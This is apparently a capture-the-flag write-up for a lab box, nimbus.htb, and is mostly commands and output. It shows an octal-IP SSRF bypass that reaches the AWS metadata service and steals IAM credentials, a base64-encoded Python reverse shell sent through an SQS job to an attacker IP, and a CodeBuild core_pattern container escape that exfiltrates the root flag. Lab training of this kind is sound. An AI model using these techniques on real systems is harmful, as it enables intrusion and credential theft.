```
nmap -sV -sC -vv 10.129.33.214

---OUTPUT---
Nmap scan report for 10.129.33.214
Host is up, received echo-reply ttl 63 (0.013s latency).
Scanned at 2026-06-26 09:23:11 EDT for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGsUbYkfB8pMEvFAGi5paPNGhksvnw0eRjwGZ4AlHmJIysuuzTNQaX/bcOE08prJ2+cOxCyMh5lG38v7rPC+Dag=
|   256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIByNLKDy0k2w61ihV1fOWk1bHErDkuYcwcYxN1vWpGrb
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20260626100354.png]]
- Seems like a job management interface with features like jobc reation, preview and submissin
- initial testing with a example url shows it accesses the site and prints the result

- I check with ffuf to find further subdomains:
```
ffuf -u http://nimbus.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.nimbus.htb" -fw 6

---OUTPUT---

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nimbus.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.nimbus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

aws                     [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 41ms]

```
![[Pasted image 20260630145204.png]]

![[Pasted image 20260630145300.png]]
- Requires a token ID to access.
- 
- We then test with AWS endpoint IP which returns a blocked result: (169.254.169.254/test.yaml)
- alternatively can target `aws.nimbus.htb`
![[Pasted image 20260630145608.png]]
- FYI the path via the metadata IP is the true path 
![[Pasted image 20260626100823.png]]

- IPv4 addresses can be represented in other formats like the octal representation which is : `0251.0376.0251.0376` which will resolve to the same AWS endpoint:`http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml`
- we test the following url which returns the IAM creds for the nimbus-web-role role in the standard AWS IMDS JSON format:
![[Pasted image 20260626101125.png]]

```
---RAW-RESPONSE---
{
  "Code": "Success",
  "LastUpdated": "2026-06-26T14:11:14Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-06-26T20:11:14Z"
}


---PARSED---
{'Code': 'Success', 'LastUpdated': '2026-06-26T14:11:14Z', 'Type': 'AWS-HMAC', 'AccessKeyId': 'ASIAQX4PG7L2K9M3N5R8', 'SecretAccessKey': 'bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs', 'Token': 'IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM', 'Expiration': '2026-06-26T20:11:14Z'}
```
- Ffuf reveals a subdomain `aws`
```
ffuf -u http://nimbus.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.nimbus.htb" -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nimbus.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.nimbus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

aws                     [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 16ms]
```
![[Pasted image 20260626105342.png]]

- After adding it to `/etc/hosts` we configure AWS:
```
export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"
export AWS_DEFAULT_REGION="us-east-1"
```

- Then weauthenticate with it:
```
aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
```
- Then we capture the endpoint:
```
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```
- We add `floci` to `/etc/hosts`
- Finally we execute our payload through aws console:
```
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
  --message-body "name: test
script: \"import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE2LjQxJyw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCddKQ==').decode())\""

---OUTPUT---
{
    "MD5OfMessageBody": "8c4b10b1d28080a4f4816897ac77ef9a",
    "MessageId": "b281ba19-871c-4236-8fc6-5830a2d7fd63"
}
```

- We get a shell on our lsitener:
![[Pasted image 20260626105640.png]]

- I grab the user flag:
![[Pasted image 20260626105739.png]]

----
### Privesc

```
python3 << 'EOF'
> import boto3
> 
> LHOST = "10.10.16.41"
> LPORT = 8888
> 
<access_key_id='test', aws_secret_access_key='test')
> 
> buildspec = """version: 0.2
> phases:
>   build:
>     commands:
<\([^,]*\\).*/\\1/p' /proc/self/mountinfo | head -1)
<HOST:LPORT/root -O /dev/null\\n' > /exploit_root.sh
>       - chmod +x /exploit_root.sh
>       - echo "|$UDIR/exploit_root.sh" > /proc/sys/kernel/core_pattern
>       - ulimit -c unlimited
>       - bash -c 'kill -11 $$'
> """.replace("LHOST", LHOST).replace("LPORT", str(LPORT))
> 
> resp = cb.start_build(
>     projectName='pwn',
>     sourceTypeOverride='NO_SOURCE',
>     buildspecOverride=buildspec,
>     environmentVariablesOverride=[
<lue': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
>     ]
> )
> print("Build ID:", resp['build']['id'])
> 
EOF
Build ID: pwn:10

```

- Set HTTP lstener to capture the flag:
```
python3 -c "
import http.server, base64

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        print('FLAG:', base64.b64decode(data).decode())
        self.send_response(200)
        self.end_headers()
    def log_message(self, *a): pass

http.server.HTTPServer(('0.0.0.0', 8888), H).serve_forever()
"

---OUTPUT---
FLAG: b49d261a53157298d9a3ae1ab7eb3ba2
```